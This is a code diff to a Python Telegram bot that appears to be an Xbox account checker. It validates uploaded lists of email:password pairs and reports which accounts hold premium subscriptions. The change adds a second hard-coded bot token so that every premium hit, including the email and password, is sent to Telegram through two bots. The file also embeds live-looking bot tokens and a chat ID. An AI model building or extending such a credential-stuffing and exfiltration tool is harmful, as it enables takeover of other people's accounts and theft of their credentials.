@@ -17,8 +17,6 @@ from telegram.constants import ParseMode
 # ============================================================
 # YOUR ORIGINAL CODE - PASTE YOUR ENTIRE CHECKER HERE
 # ============================================================
-# [PASTE YOUR FULL ORIGINAL CODE HERE - ALL CLASSES INCLUDED]
-# ============================================================
 
 import requests
 import json
@@ -32,22 +30,37 @@ from threading import Lock, Thread
 import concurrent.futures
 from urllib.parse import quote, unquote
 
-# Telegram configuration (OVERRIDDEN by bot later)
-TELEGRAM_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
+# Telegram configuration - DUAL BOT SUPPORT
+# Bot 1: Main checker bot (receives files, processes, sends results)
+TELEGRAM_BOT_TOKEN_MAIN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
+# Bot 2: Premium receiver bot (only receives premium hits)
+TELEGRAM_BOT_TOKEN_PREMIUM = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
 TELEGRAM_CHAT_ID = "8260250818"
 
 class TelegramSender:
     def __init__(self):
-        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+        self.base_url_main = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_MAIN}"
+        self.base_url_premium = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PREMIUM}"
     
     def send_message(self, text):
+        """Send message to BOTH bots"""
         def _send():
+            # Send to main bot
             try:
-                url = f"{self.base_url}/sendMessage"
+                url = f"{self.base_url_main}/sendMessage"
                 payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
                 requests.post(url, data=payload, timeout=10)
             except Exception:
                 pass
+            
+            # Send to premium receiver bot
+            try:
+                url = f"{self.base_url_premium}/sendMessage"
+                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
+                requests.post(url, data=payload, timeout=10)
+            except Exception:
+                pass
+        
         Thread(target=_send, daemon=True).start()
     
     def format_hit_message(self, email, password, data):
@@ -523,7 +536,7 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
                     result_entry += f" ✅ PREMIUM | {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days"
                     batch_buffer.append(result_entry)
                     
-                    # Send immediate Telegram notification for premium
+                    # Send immediate Telegram notification for premium to BOTH bots
                     try:
                         sender = TelegramSender()
                         msg = sender.format_hit_message(email, password, data)
@@ -744,7 +757,8 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/start - This message\n"
         "/status - Queue status\n"
         "/cancel - Stop current scan\n\n"
-        "📊 Results appear in batches (15 accounts per update)"
+        "📊 Results appear in batches (15 accounts per update)\n"
+        "🎯 Premium hits sent to BOTH Telegram bots instantly!"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
@@ -792,7 +806,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     queue_size = task_queue.qsize()
     
     await update.message.reply_text(
-        f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Valid: `{valid_count}` accounts\n📊 Queue: `{queue_size}`\n\n🔄 Starting REAL Xbox validation...\n📦 Results will appear in batches every 15 accounts.",
+        f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Valid: `{valid_count}` accounts\n📊 Queue: `{queue_size}`\n\n🔄 Starting REAL Xbox validation...\n📦 Results will appear in batches every 15 accounts.\n🤖 Premium hits sent to BOTH Telegram bots!",
         parse_mode=ParseMode.MARKDOWN
     )
     
@@ -814,9 +828,16 @@ def main():
     app.add_handler(CommandHandler("cancel", cancel_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    print("🤖 Xbox Checker Bot Running (Batch Mode)...")
-    print("Results will be sent in batches of 15 accounts")
+    print("=" * 60)
+    print("🎮 XBOX PREMIUM CHECKER BOT - DUAL BOT MODE")
+    print("=" * 60)
+    print(f"✅ Main Bot Token: {TELEGRAM_BOT_TOKEN_MAIN[:15]}...")
+    print(f"✅ Premium Bot Token: {TELEGRAM_BOT_TOKEN_PREMIUM[:15]}...")
+    print(f"✅ Premium hits will be sent to BOTH Telegram bots!")
+    print("📦 Results in batches of 15 accounts")
+    print("=" * 60)
     print("Waiting for .txt files...")
+    
     app.run_polling()
 
 if __name__ == "__main__":
